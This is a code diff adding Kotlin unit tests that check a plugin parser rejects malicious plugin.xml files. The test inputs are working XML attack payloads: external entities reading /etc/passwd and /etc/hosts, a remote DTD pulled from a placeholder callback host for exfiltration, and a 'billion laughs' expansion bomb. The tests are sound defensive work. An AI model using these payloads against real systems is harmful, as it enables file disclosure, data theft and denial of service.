@@ -1345,6 +1345,138 @@ class InvalidPluginsTest(fileSystemType: FileSystemType) : IdePluginManagerTest(
     )
   }
 
+  @Test
+  fun `failed to parse xml with xxe in value`() {
+    val xxe = """
+      <!DOCTYPE description [
+        <!ENTITY file SYSTEM "file:///etc/passwd">
+      ]>
+      <idea-plugin>
+        <id>someId</id>
+        <name>someName</name>
+        <version>1</version>
+        <vendor email="vendor.com" url="url">vendor</vendor>
+        <description>&file;</description>
+        <change-notes>these change-notes are looooooooooong enough</change-notes>
+        <idea-version since-build="131.1"/>
+        <depends>com.intellij.modules.lang</depends>
+      </idea-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1, "plugin.xml"))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with xxe in attribute`() {
+    val xxe = """
+      <!DOCTYPE doc [
+        <!ENTITY ff SYSTEM "file:///etc/hosts">
+      ]>
+      
+      <idea-plugin>
+        <id>someId</id>
+        <name>someName</name>
+        <version>1</version>
+        <vendor email="vendor.com" url="url">vendor</vendor>
+        <description info="&ff;">test</description>
+        <change-notes>these change-notes are looooooooooong enough</change-notes>
+        <idea-version since-build="131.1"/>
+        <depends>com.intellij.modules.lang</depends>
+      </idea-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1, "plugin.xml"))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with remote dtd xxe`() {
+    val xxe = """
+      <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://YOUR_CALLBACK/evil.dtd">
+        %remote;
+      ]>
+      
+      <idea-plugin>
+        <id>someId</id>
+        <name>someName</name>
+        <version>1</version>
+        <vendor email="vendor.com" url="url">vendor</vendor>
+        <description>&exfil;</description>
+        <change-notes>these change-notes are looooooooooong enough</change-notes>
+        <idea-version since-build="131.1"/>
+        <depends>com.intellij.modules.lang</depends>
+      </idea-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1, "plugin.xml"))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with error local dtd`() {
+    val xxe = """
+      <!DOCTYPE root [
+        <!ENTITY % local "abc">
+        <!ENTITY name "%local;">
+        <!ENTITY ex "start &name; end">
+      ]>
+      
+      <idea-plugin>
+        <id>someId</id>
+        <name>someName</name>
+        <version>1</version>
+        <vendor email="vendor.com" url="url">vendor</vendor>
+        <description>&ex;</description>
+        <change-notes>these change-notes are looooooooooong enough</change-notes>
+        <idea-version since-build="131.1"/>
+        <depends>com.intellij.modules.lang</depends>
+      </idea-plugin>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1, "plugin.xml"))
+    )
+  }
+
+  @Test
+  fun `failed to parse xml with xml bomb`() {
+    val xxe = """
+      <!DOCTYPE lolz [
+       <!ENTITY a "aaaaaaaaaa">
+       <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+       <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+       <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+       <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+      ]>
+      
+      <idea-plugin>
+        <id>someId</id>
+        <name>someName</name>
+        <version>1</version>
+        <vendor email="vendor.com" url="url">vendor</vendor>
+        <description>&e;</description>
+        <change-notes>these change-notes are looooooooooong enough</change-notes>
+        <idea-version since-build="131.1"/>
+        <depends>com.intellij.modules.lang</depends>
+      </idea-plugin>
+      </package>
+    """.trimIndent()
+
+    `test invalid plugin xml`(
+      pluginXmlContent = xxe,
+      expectedProblems = listOf(UnexpectedDescriptorElements(1, "plugin.xml"))
+    )
+  }
+
   @After
   fun tearDown() {
     close()
